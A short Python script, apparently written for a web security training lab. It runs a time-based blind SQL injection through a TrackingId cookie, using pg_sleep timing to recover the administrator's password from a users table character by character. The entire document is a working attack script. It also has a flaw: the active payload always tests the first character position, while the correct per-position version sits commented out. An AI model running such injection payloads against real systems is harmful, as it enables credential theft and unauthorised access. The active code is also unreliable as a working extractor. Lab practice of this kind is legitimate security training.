import requests, time, sys

URL = "https://ac701f0f1e6da66b80ff0029003e00f1.web-security-academy.net"
CARACTERES = "abcdefghijklmnopqrstuvwxyz1234567890"
CONTENIDO = ""

def check(payload):
    cookies_dict = {"TrackingId": payload}
    time_start = time.time()
    response = requests.get(URL, cookies=cookies_dict)
    time_end = time.time()

    if time_end - time_start > 5:
        return 1

for posicion in range(1,21):
    for caracter in CARACTERES:
        #payload = "';SELECT+CASE+WHEN+(username='administrator'+AND+substring(password,{},1)='{}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--".format(str(posicion),caracter)
        payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='{}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--".format(caracter)
        print("Caracter: {}, Posicion:{}".format(caracter,posicion))
        if check(payload):
                CONTENIDO += caracter
                print(CONTENIDO)
                break

print("\n[*] Contenido: {}".format(CONTENIDO))